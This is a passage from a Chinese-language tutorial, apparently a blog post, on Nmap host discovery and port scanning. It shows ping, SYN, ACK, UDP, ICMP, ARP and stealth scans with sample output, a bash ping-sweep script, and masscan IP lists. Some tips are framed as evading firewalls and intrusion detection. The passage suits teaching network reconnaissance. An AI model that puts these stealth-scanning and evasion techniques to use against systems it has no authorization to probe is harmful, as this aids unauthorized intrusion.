Ping 扫描</td></tr><tr><td>-PE;-PP;-PM</td><td>ICMP Ping Types 扫描</td></tr><tr><td>-PR</td><td>ARP Ping 扫描</td></tr><tr><td>-sL</td><td>列表扫描</td></tr><tr><td>-6</td><td>扫描 IPv6 地址</td></tr><tr><td>–traceroute</td><td>路由跟踪</td></tr><tr><td>-PY</td><td>SCTP INIT Ping 扫描</td></tr></tbody></table><h3 id="一个简单的扫描"><a href="#一个简单的扫描" class="headerlink" title="一个简单的扫描"></a>一个简单的扫描</h3><p>该扫描方式可以快递地对 IP 或者域名进行扫描：</p><p><img src="http://qiniuyun.lintstar.top/20200802095959.png" alt="20200802095959"></p><p>可以使用 –packet-trace 查看协议扫描的细节：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.11.29.138 --packet-trace</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniuyun.lintstar.top/20200802100228.png" alt="20200802100228"></p><p>可以使用 -v 查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.11.29.138 -v</span><br></pre></td></tr></table></figure></p><p>查看Linux源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/apt/sources.list</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniuyun.lintstar.top/20200802100851.png" alt="20200802100851"></p><p><code>sudo apt-get update</code> 自动使用最近源，指定是多此一举</p><p><img src="http://qiniuyun.lintstar.top/20200802101033.png" alt="20200802101033"></p><h3 id="使用-Zenmap-进行扫描"><a href="#使用-Zenmap-进行扫描" class="headerlink" title="使用 Zenmap 进行扫描"></a>使用 Zenmap 进行扫描</h3><p>Zenmap 是 Nmap 官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性。</p><h3 id="Ping-扫描"><a href="#Ping-扫描" class="headerlink" title="Ping 扫描"></a>Ping 扫描</h3><p>Ping 扫描只进行 Ping，然后显示出在线的主机，可以比较快速地获取目标信息而不会被轻易发现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.20.24.1/24 -sP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:59 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.016s latency).</span><br><span class="line">Nmap scan report for 10.20.24.231</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Nmap scan report for 10.20.24.236</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Nmap scan report for 10.20.24.238</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Nmap scan report for 10.20.24.239</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00087s latency).</span><br><span class="line">Nmap done: 256 IP addresses (6 hosts up) scanned in 3.36 seconds</span><br></pre></td></tr></table></figure></p><p>也可以直接使用 Ping 命令来发现局域网主机：</p><ul><li>Linux 主机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ip=&quot;172.16.114.&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;ping log:&quot; &gt; ./ping.txt</span><br><span class="line">for i in &#123;1..254&#125;</span><br><span class="line">do</span><br><span class="line">    ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp;</span><br><span class="line">done</span><br><span class="line">echo &quot;wait 5s....&quot;</span><br><span class="line">sleep 5</span><br><span class="line">cat ./ping.txt</span><br><span class="line">cat ./ping.txt | wc -l</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://qiniuyun.lintstar.top/20200802101438.png" alt="20200802101438"></p><p><img src="http://qiniuyun.lintstar.top/20200802101517.png" alt="20200802101517"></p><ul><li>Windows 主机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I</span><br></pre></td></tr></table></figure></li></ul><h3 id="无-Ping-扫描"><a href="#无-Ping-扫描" class="headerlink" title="无 Ping 扫描"></a>无 Ping 扫描</h3><p>用户防火墙禁止 Ping 的情况下，可以使用 -P0 或者 -Pn可以避免被防火墙发现。</p><p><code>nmap无法突破windows防火墙，但是内网中很多域为方便都是不开防火墙的，所以nmap依旧吃香。</code></p><p><img src="http://qiniuyun.lintstar.top/20200802095420.png" alt="20200802095420"></p><p>开防火墙后扫描3306（已知开放）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.11.29.138 -p 3306 -Pn</span><br></pre></td></tr></table></figure></p><p><img src="http://qiniuyun.lintstar.top/20200802095640.png" alt="20200802095640"></p><h3 id="TCP-SYN-Ping-扫描"><a href="#TCP-SYN-Ping-扫描" class="headerlink" title="TCP SYN Ping 扫描"></a>TCP SYN Ping 扫描</h3><p>通常情况下，Nmap 默认 Ping 扫描是使用 TCP ACK 和 ICMP Echo 请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，我们可以使用 TCP SYN Ping 扫描来对目标主机进行存活判断：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.20.24.244 -PS</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:54 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><p>有时候这种扫描结果不不准确，这个时候需要制定一个端口或端口范围来避免这种情况。</p><h3 id="TCP-ACK-Ping-扫描"><a href="#TCP-ACK-Ping-扫描" class="headerlink" title="TCP ACK Ping 扫描"></a>TCP ACK Ping 扫描</h3><p>使用 -PA选项可以进行 TCP ACK Ping 扫描，它与 TCP SYN Ping 扫描比较类似，区别在于 TCP 的标志位是 ACK 而不是 SYN，使用这种方式可以探测阻止 SYN 包或 ICMP Echo 请求的主机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.244 -PA</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:02 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 743 closed ports, 254 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><p>也可以同时使用-PS与-PA 既发送 SYN 又发送 ACK，提高通过防火墙的概率：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.244 -PS -PA</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:03 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><h3 id="UDP-Ping-扫描"><a href="#UDP-Ping-扫描" class="headerlink" title="UDP Ping 扫描"></a>UDP Ping 扫描</h3><p>需要使用 root 权限来运行，使用 -PU 选项可以发送一个空的冷门的 UDP 报文到指定端口，如果目标主机响应则返回一个 ICMP 端口不可达错误，如果目标主机不是存活状态则会返回各种 ICMP 错误信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PU</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:07 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><p>尝试手动来验证看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.20.24.244 -PU --packet-trace |grep 5900</span><br></pre></td></tr></table></figure></p><h3 id="CMP-Ping-Types-扫描"><a href="#CMP-Ping-Types-扫描" class="headerlink" title="CMP Ping Types 扫描"></a>CMP Ping Types 扫描</h3><p>使用-PE、-PP、-PM选项可以进行 ICMP Ping Types 扫描。ICMP（Internet Control Message Protocol）是 Internet 控制报文协议。是 TCP/IP 协议族的一个子协议，用于在 IP 主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><h4 id="ICMP-Echo-扫描"><a href="#ICMP-Echo-扫描" class="headerlink" title="ICMP Echo 扫描"></a>ICMP Echo 扫描</h4><p>-PE 选项可以发起一个 ICMP Echo 扫描来探测目标主机是否在线，因为很多主机的防火墙会禁止这些报文，所以外网扫描基本上不好用，可以用于内网扫描。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PE</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><h4 id="ICMP-时间戳-Ping-扫描"><a href="#ICMP-时间戳-Ping-扫描" class="headerlink" title="ICMP 时间戳 Ping 扫描"></a>ICMP 时间戳 Ping 扫描</h4><p>大多数防火墙可能不允许 ICMP Echo 请求，但是由于配置不当可能回复 ICMP 时间错请求，所以可以使用 -PP 时间戳扫描来确定目标主机是否存活。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.000029s latency).</span><br><span class="line">Not shown: 809 closed ports, 189 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><h4 id="ICMP-地址掩码-Ping-扫描"><a href="#ICMP-地址掩码-Ping-扫描" class="headerlink" title="ICMP 地址掩码 Ping 扫描"></a>ICMP 地址掩码 Ping 扫描</h4><p>这种扫描方式会试图用备选的 ICMP 登记 Ping 指定主机，通常有不错的穿透防火墙的效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.244 -PM</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:05 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><h3 id="ARP-Ping-扫描"><a href="#ARP-Ping-扫描" class="headerlink" title="ARP Ping 扫描"></a>ARP Ping 扫描</h3><p>-PR选项通常在扫描局域网时使用，ARP（Address Resolution Protocol）地址解析协议，是根据 IP 地址获取物理地址的一个 TCP/IP 协议，在内网中使用 ARP Ping 扫描方式比较搞笑，在本地局域网中防火墙基本上不会禁止 ARP 请求，所以比其他 Ping 扫描效率都更高。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.244 -PR</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:10 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 746 closed ports, 252 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds</span><br><span class="line">➜  ~ nmap 10.20.24.244</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:11 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">4000/tcp open  remoteanything</span><br><span class="line">5900/tcp open  vnc</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds</span><br></pre></td></tr></table></figure></p><h3 id="扫描列表"><a href="#扫描列表" class="headerlink" title="扫描列表"></a>扫描列表</h3><p>显示扫描的所有主机的列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.10-20 -sL</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:19 CST</span><br><span class="line">Nmap scan report for 10.20.24.10</span><br><span class="line">Nmap scan report for 10.20.24.11</span><br><span class="line">Nmap scan report for 10.20.24.12</span><br><span class="line">Nmap scan report for 10.20.24.13</span><br><span class="line">Nmap scan report for 10.20.24.14</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Nmap scan report for 10.20.24.16</span><br><span class="line">Nmap scan report for 10.20.24.17</span><br><span class="line">Nmap scan report for 10.20.24.18</span><br><span class="line">Nmap scan report for 10.20.24.19</span><br><span class="line">Nmap scan report for 10.20.24.20</span><br><span class="line">Nmap done: 11 IP addresses (0 hosts up) scanned in 0.01 seconds</span><br></pre></td></tr></table></figure></p><p>可以使用 Masscan 批量生成 IP 地址表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan -sL 10.0.0.0/24 &gt; c段.txt</span><br><span class="line">masscan -sL 10.0.0.0/16 &gt; b段.txt</span><br><span class="line">masscan -sL 10.0.0.0/8  &gt; a段.txt</span><br></pre></td></tr></table></figure></p><h3 id="扫描一个-IPv6-地址"><a href="#扫描一个-IPv6-地址" class="headerlink" title="扫描一个 IPv6 地址"></a>扫描一个 IPv6 地址</h3><p>IPv6 是 Internet Protocol Version 6 的缩写，用于替代现在用的 IPv4 的下一代 IP 协议，Nmap 很早就支持对 IPv6 的扫描，使用 -6 选项就可以进行对 IPv6 的扫描。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -6 1::224:11c</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:34 CST</span><br><span class="line">Nmap scan report for 1::224:11c</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 968 closed ports, 30 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">5900/tcp open  vnc</span><br></pre></td></tr></table></figure></p><h3 id="路由跟踪"><a href="#路由跟踪" class="headerlink" title="路由跟踪"></a>路由跟踪</h3><p>使用 –traceroute 可以轻松地查出从本地计算机到目标之间所经过的网络节点，并可以查看过各个节点的时间：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap www.sqlsec.com --traceroute</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:35 CST</span><br><span class="line">Nmap scan report for www.sqlsec.com (121.196.37.183)</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">21/tcp   open     ftp</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">80/tcp   open     http</span><br><span class="line">111/tcp  open     rpcbind</span><br><span class="line">443/tcp  open     https</span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">888/tcp  open     accessbuilder</span><br><span class="line">3306/tcp open     mysql</span><br><span class="line">4444/tcp filtered krb524</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.41 ms 10.20.24.1</span><br><span class="line">2   0.38 ms 172.16.0.1</span><br><span class="line">3   6.50 ms 61.164.47.193</span><br><span class="line">4   ...</span><br><span class="line">5   1.70 ms 61.164.31.218</span><br><span class="line">6   2.51 ms 115.236.101.73</span><br><span class="line">7   1.78 ms 45.112.223.29</span><br><span class="line">8   1.92 ms 103.41.142.173</span><br><span class="line">9   ... 10</span><br><span class="line">11  1.77 ms 121.196.37.183</span><br></pre></td></tr></table></figure></p><h3 id="SCTP-INIT-Ping-扫描"><a href="#SCTP-INIT-Ping-扫描" class="headerlink" title="SCTP INIT Ping 扫描"></a>SCTP INIT Ping 扫描</h3><p>SCTP（Stream Control Transmission Protocol，流控制传输协议）是在 2000 年定义的一个传输层，SCTP 可以看作是 TCP 协议的改进。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.15 -PY</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:40 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.0071s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">199/tcp  open  smux</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8888/tcp open  sun-answerbook</span><br></pre></td></tr></table></figure></p><h3 id="探索网络"><a href="#探索网络" class="headerlink" title="探索网络"></a>探索网络</h3><p>本节所用到的 Nmap 命令表：</p><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-T</td><td>指定时间模板</td></tr><tr><td>-p</td><td>指定端口</td></tr><tr><td>-sS</td><td>TCP SYN 扫描</td></tr><tr><td>-sU</td><td>UDP 扫描</td></tr><tr><td>-sN;-sF;-sX</td><td>隐蔽扫描</td></tr><tr><td>-sA</td><td>TCP ACK 扫描</td></tr><tr><td>-sW</td><td>TCP 窗口扫描</td></tr></tbody></table><h3 id="时间模板"><a href="#时间模板" class="headerlink" title="时间模板"></a>时间模板</h3><p>在 Nmap 提供了一些简单的方法，使用 6 个时间模板，使用时采用 -T 选项及数字 (0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-T0 偏执的</td><td>非常慢，用于 IDS 躲避</td></tr><tr><td>-T1 鬼祟的</td><td>缓慢的扫描，用于 IDS 躲避</td></tr><tr><td>-T2 文雅的</td><td>降低了扫描速度以使用更少的带宽和目标主机资源</td></tr><tr><td>-T3 普通的</td><td>默认模式 根据目标的反应自动调整时间</td></tr><tr><td>-T4 野蛮的</td><td>假设用户具有可靠的网络从而加速扫描，可能会漏扫</td></tr><tr><td>-T5 疯狂的</td><td>极速扫描，为了获得速度而牺牲准确性</td></tr></tbody></table><h3 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h3><p>可以指定端口号进行扫描，可以是一个端口也可以是一个范围：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap 10.20.24.1/24 -p 22</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:34 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.0077s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.231</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.236</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.238</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp closed ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.239</span><br><span class="line">Host is up (0.00070s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp closed ssh</span><br></pre></td></tr></table></figure></p><h3 id="TCP-SYN-扫描"><a href="#TCP-SYN-扫描" class="headerlink" title="TCP SYN 扫描"></a>TCP SYN 扫描</h3><p>比较常用的扫描方式，也被称为半开放扫描，因为不用进行 TCP 连接 3 次握手，所以速度比较快，平均一秒可以扫描上千个端口，而且相对来说也比较隐蔽，很难被防火墙或管理员发现，因为不会进行 TCP 连接，如果出现被过滤的情况，可以考虑使用 SYN 扫描，可以很明确地区分出端口的开放状态。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo nmap 10.20.24.15 -sS</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:41 CST</span><br><span class="line">Nmap scan report for 10.20.24.15</span><br><span class="line">Host is up (0.0071s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">199/tcp  open  smux</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8888/tcp open  sun-answerbook</span><br></pre></td></tr></table></figure></p><h3 id="TCP-连接扫描"><a href="#TCP-连接扫描" class="headerlink" title="TCP 连接扫描"></a>TCP 连接扫描</h3><p>当 -sS 不能使用的时候，可以使用 -sT 更加基础、稳定的扫描方式。</p><h3 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><p>因为要等待目标主机响应，所以速度比较慢，一般配合 -p 指定端口来使用，否则很耗费时间。</p><h3 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h3><ul><li>-sN Null 扫描</li><li>-sF FIN 扫描</li><li>-sX Xmas 扫描<br>这些扫描方式会躲过一些无状态防火墙的过滤，效果会更隐蔽。</li></ul><h3 id="TCP-ACK-扫描"><a href="#TCP-ACK-扫描" class="headerlink" title="TCP ACK 扫描"></a>TCP ACK 扫描</h3><p>确定是无法判断端口是开放还是过滤的。unfiltered 表明 ACK 报文不能到达，filtered 表示不响应的端口。</p><h3 id="TCP-窗口扫描"><a href="#TCP-窗口扫描" class="headerlink" title="TCP 窗口扫描"></a>TCP 窗口扫描</h3><p>类似于ACK 扫描，通过返回的窗口大小数据判断目标端口是否开放或者关闭。扫描结果是不准确的，如果 100 个端口里面只有 2 个关闭的，那很可能是开放的。</p><h3 id="指纹探测"><a href="#指纹探测" class="headerlink" title="指纹探测"></a>指纹探测</h3><p>Nmap 